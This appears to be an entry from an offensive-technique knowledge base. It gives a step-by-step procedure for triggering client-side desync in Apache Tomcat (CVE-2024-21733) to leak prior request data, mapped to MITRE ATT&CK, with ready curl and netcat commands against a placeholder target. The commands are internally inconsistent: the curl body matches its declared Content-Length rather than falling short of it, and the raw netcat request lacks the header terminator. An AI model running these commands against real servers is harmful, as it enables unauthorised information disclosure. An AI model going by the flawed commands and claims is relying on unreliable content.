---
tags:
  - http-request-smuggling
  - client-side-desync
  - exploitation
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/netcat]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands:
  - '[[commands/curl-send-incomplete-post]]'
  - '[[commands/netcat-send-http-request]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: b2d122bb-c904-4f3e-91ba-dd717507d71c
created_at: '2025-12-13T09:01:22.517Z'
updated_at: '2025-12-13T09:01:22.517Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft and Send Incomplete POST Request

## Summary

This procedure crafts and sends an incomplete HTTP POST request to exploit Client-Side Desync in Apache Tomcat, triggering desynchronization and potential inclusion of prior request data in error responses.

## Description

By setting Content-Length to 6 but providing only partial body data, the server mishandles the request, leading to information disclosure. This affects Tomcat versions 8.5.7-8.5.63 and 9.0.0-M11-9.0.43.

## Requirements

1. Vulnerable Apache Tomcat server identified
2. Tools like curl or netcat
3. Direct network access to the target

## Defense

Defensive measures and detection strategies:

- Apply Tomcat patches for CVE-2024-21733
- Use WAF to detect mismatched Content-Length in POST requests

## Objectives

1. Trigger desynchronization
2. Elicit error response with leaked data
3. Exploit for information disclosure

## Instructions

### Step 1: Craft the Request

**Context**: Prepare an HTTP/1.1 POST with mismatched Content-Length.

**Command** ([[commands/curl-send-incomplete-post]]):
```bash
curl -X POST http://target.com/ -H 'Content-Length: 6' --data 'incomp'
```

> This sends an incomplete body, causing the server to desync.

### Step 2: Alternative Sending Method

**Context**: Use netcat for finer control over the request.

**Command** ([[commands/netcat-send-http-request]]):
```bash
echo -ne 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nincomp' | nc target.com 80
```

> This pipes the raw request to the server.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used

- [[commands/curl-send-incomplete-post]]
- [[commands/netcat-send-http-request]]

## Tools Used

- [[tools/curl]]
- [[tools/netcat]]

## Tags

- [[http-request-smuggling]]
- [[client-side-desync]]
